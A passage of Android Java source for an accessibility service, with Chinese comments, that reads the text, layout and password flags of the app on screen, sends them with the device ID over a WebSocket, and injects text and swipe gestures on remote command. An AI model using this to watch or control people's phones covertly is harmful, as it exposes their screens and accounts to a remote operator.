            List<AccessibilityNodeInfo> list = new ArrayList<>();
            collectViewBounds(rootNode, list);
//            Log.i(TAG, "list node size:" + list.size());
            // After collecting bounds, you can create an image
            send(list, event);
            return;
        } else {
            Log.i(TAG, "rootNode is null");
        }
    }

    private void performTextInput(AccessibilityNodeInfo nodeInfo, String text) {
        // 设置文本到目标节点
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
    }

    private void collectViewBounds(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list) {
        if (node == null) return;
        list.add(node);
        for (int i = 0; i < node.getChildCount(); i++) {
            collectViewBounds(node.getChild(i), list);
        }
    }

    private long last = System.currentTimeMillis();
    private long lastPong = System.currentTimeMillis();
    private long lastHeartTime = 0;


    private long connectTime;


    private void send(List<AccessibilityNodeInfo> list, AccessibilityEvent event) {
        if (list.isEmpty()) return;
        int uniId = 1;
        List<Message.ScreenItem> screenItems = new ArrayList<>();
        Map<String, Integer> idCount = new HashMap<>();
        for (AccessibilityNodeInfo node : list) {
            if (!node.isVisibleToUser()) {
                //TODO 仅显示
                continue;
            }
            String text = node.getText() != null ? node.getText().toString() : "";
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            Message.ScreenItem.Builder builder = Message.ScreenItem.newBuilder();
            builder.setX(bounds.left);
            builder.setY(bounds.top);
            builder.setHeight(bounds.height());
            builder.setWidth(bounds.width());

            builder.setText(text);
            builder.setUniqueId(uniId++);
            String viewId = node.getViewIdResourceName();
            if (viewId != null) {
                builder.setId(viewId);
                Integer count = idCount.get(viewId);
                if (count == null) {
                    count = 0;
                }
                count++;
                idCount.put(viewId, count);
            }
            builder.setIsFocused(node.isFocused());
            builder.setIsFocusable(node.isFocusable());
            builder.setIsScrollable(node.isScrollable());
            builder.setIsCheckable(node.isCheckable());
            builder.setIsClickable(node.isClickable());
            builder.setIsEditable(node.isEditable());
            builder.setIsSelected(node.isSelected());
            builder.setIsChecked(node.isChecked());
            builder.setIsPassword(node.isPassword());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                builder.setIsTextEntryKey(node.isTextEntryKey());
            }
            builder.setIsVisibleToUser(node.isVisibleToUser());


            Message.ScreenItem screenItem = builder.build();
            screenItems.add(screenItem);
        }


        // Draw rectangles and text for each view
        WebSocket webSocket = wsRef.get();
        if (webSocket != null && !webSocket.isClosed()) {
            String packageName = "";
            Integer max = 0;
            for (Map.Entry<String, Integer> entry : idCount.entrySet()) {
                Integer value = entry.getValue();
                String key = entry.getKey();
                if (value > max) {
                    max = value;
                    packageName = key;
                }
            }
            int index = packageName.indexOf(":");
            packageName = packageName.substring(0, index);
//            String packageName = event.getPackageName().toString();
            String appName = Utils.getAppNameFromPackageName(packageName, this);
//            Screen screen = new Screen(viewInfoList, packageName, getAppNameFromPackageName(packageName), widthPixels, heightPixels);
            Log.i(TAG, "刷新屏幕!");
            try {
                Message.ScreenInfo.Builder screenInfoBuilder = Message.ScreenInfo.newBuilder();
                screenInfoBuilder.setAppName(appName);
                screenInfoBuilder.setPackageName(packageName);
                screenInfoBuilder.setDeviceId(androidId);
                if (event != null) {
                    String className = event.getClassName() != null ? event.getClassName().toString() : "";
                    screenInfoBuilder.setActivityName(className);
                }
                screenInfoBuilder.addAllItems(screenItems);
                Message.ScreenInfo screenInfo = screenInfoBuilder.build();
                webSocket.write(Utils.encode(Constant.MessageType.screen_info, screenInfo));
            } catch (Exception ex) {
                Log.i(TAG, "发送错误" + ex.getMessage());
            }
        }

    }

    /**
     * 执行滑动操作
     *
     * @param startX   滑动起点的X坐标
     * @param startY   滑动起点的Y坐标
     * @param endX     滑动终点的X坐标
     * @param endY     滑动终点的Y坐标
     * @param duration 滑动的持续时间（毫秒）
     */
    private void performSwipe(float startX, float startY, float endX, float endY, long duration) {
        Path path = new Path();
        path.moveTo(startX, startY);  // 滑动起点
        path.lineTo(endX, endY);      // 滑动终点

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, duration);
        GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(stroke)
                .build();

        dispatchGesture(gesture, null, null); // 执行手势
    }

    private void performSwipe(float startX, float startY, float endX, float endY, long startTime, long duration) {
        Path path = new Path();
        path.moveTo(startX, startY);  // 滑动起点
        path.lineTo(endX, endY);      // 滑动终点

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, startTime, duration);
        GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(stroke)
                .build();

        dispatchGesture(gesture, null, null); // 执行手势
    }


    private int currentSegmentIndex = 0; // 当前手势段的索引

    // 模拟分段滑动
    public void simulateSegmentedSwipe(Message.SlideReq slideReq, int segmentSize) {
        Log.i(TAG, "开始滑动");
        List<Message.Point> pointsList = slideReq.getPointsList();
        // 如果当前段的起点超出范围，表示滑动已经完成
        if (currentSegmentIndex >= pointsList.size() - 1) {
            Log.i("AccessibilityService", "滑动完成");

            // 滑动完成后，重置 currentSegmentIndex 为 0
            currentSegmentIndex = 0;
            return;
        }

        // 构建一个手势
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        Path gesturePath = new Path();

        // 设置当前段的起点
        Message.Point startPoint = pointsList.get(currentSegmentIndex);
        gesturePath.moveTo(startPoint.getX(), startPoint.getY());
        Log.i(TAG, String.format("start:(%s,%s)", startPoint.getX(), startPoint.getY()));

        int segmentEnd = Math.min(currentSegmentIndex + segmentSize, pointsList.size() - 1);

        // 构建一段路径
        long segmentDuration = 0; // 初始化为 0
        for (int i = currentSegmentIndex + 1; i <= segmentEnd; i++) {
            Message.Point currentPoint = pointsList.get(i);
            gesturePath.lineTo(currentPoint.getX(), currentPoint.getY());
            Log.i(TAG, String.format("end:(%s,%s)", currentPoint.getX(), currentPoint.getY()));
            // 计算每一段的持续时间，累加 delay
            segmentDuration += currentPoint.getDelay();

            // 创建 StrokeDescription
            GestureDescription.StrokeDescription strokeDescription =
                    new GestureDescription.StrokeDescription(gesturePath, 0, segmentDuration); // 每段的持续时间

            // 添加到手势
            gestureBuilder.addStroke(strokeDescription);

        }


        // 构建手势
        GestureDescription gesture = gestureBuilder.build();

        // 发送手势并在手势完成后递归调用
        dispatchGesture(gesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.i(TAG, "当前手势段完成");

                // 继续下一个段的滑动
                currentSegmentIndex = segmentEnd;
                new Handler(Looper.getMainLooper()).post(() -> simulateSegmentedSwipe(slideReq, segmentSize));
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.i(TAG, "手势取消");
            }
        }, null);
    }


    @Override
    public void onInterrupt() {
        Log.i(TAG, "onInterrupt: ");
    }

}

